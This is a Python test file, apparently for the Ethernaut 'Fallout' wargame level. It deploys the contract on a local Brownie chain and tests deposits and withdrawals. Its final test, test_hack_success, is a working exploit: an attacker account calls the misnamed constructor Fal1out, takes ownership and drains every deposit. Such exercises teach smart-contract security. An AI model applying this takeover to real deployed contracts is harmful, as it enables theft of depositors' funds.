import pytest

from brownie import reverts, accounts, exceptions
from brownie.convert import EthAddress

from scripts.deploy import deploy_fallout_contract


def test_deploy():
    # Arrange
    fallout_contract = deploy_fallout_contract()
    # Act
    fallout_contract.allocate({"from": accounts[1], "value": 999999})
    # Assert
    assert fallout_contract.allocatorBalance(accounts[1]) == 999999
    assert fallout_contract.balance() == 999999
    assert (
        EthAddress(fallout_contract.owner())
        == "0x0000000000000000000000000000000000000000"
    )


def test_withdraw_fail():
    # Arrange
    fallout_contract = deploy_fallout_contract()
    # Act
    fallout_contract.allocate({"from": accounts[1], "value": 999999})
    # Assert
    assert fallout_contract.allocatorBalance(accounts[1]) == 999999
    assert fallout_contract.balance() == 999999
    assert (
        EthAddress(fallout_contract.owner())
        == "0x0000000000000000000000000000000000000000"
    )
    with pytest.raises(exceptions.VirtualMachineError):
        fallout_contract.collectAllocations({"from": accounts[1]})
    assert fallout_contract.balance() == 999999


### The sad fallout contract doesn't even require an attack contract to pwn.  just a simple transfer.  L4m3rz.
def test_hack_success():
    # Arrange
    attacker = accounts[3]
    fallout_contract = deploy_fallout_contract()
    # Act 1 - Fund from multiple wallets
    fallout_contract.allocate({"from": accounts[0], "value": 999999})
    fallout_contract.allocate({"from": accounts[1], "value": 999999})
    fallout_contract.allocate({"from": accounts[2], "value": 999999})
    fallout_contract.allocate({"from": attacker, "value": 12})

    # Assert 1
    assert fallout_contract.allocatorBalance(accounts[1]) == 999999
    assert fallout_contract.balance() == 3000009
    assert (
        EthAddress(fallout_contract.owner())
        == "0x0000000000000000000000000000000000000000"
    )
    with pytest.raises(exceptions.VirtualMachineError):
        fallout_contract.collectAllocations({"from": accounts[1]})
    assert fallout_contract.balance() == 3000009
    # Act 2 - Attack
    fallout_contract.Fal1out({"from": attacker})
    # Assert 2
    assert fallout_contract.balance() == 3000009
    assert fallout_contract.owner() == attacker
    fallout_contract.collectAllocations({"from": attacker})
    assert fallout_contract.balance() == 0
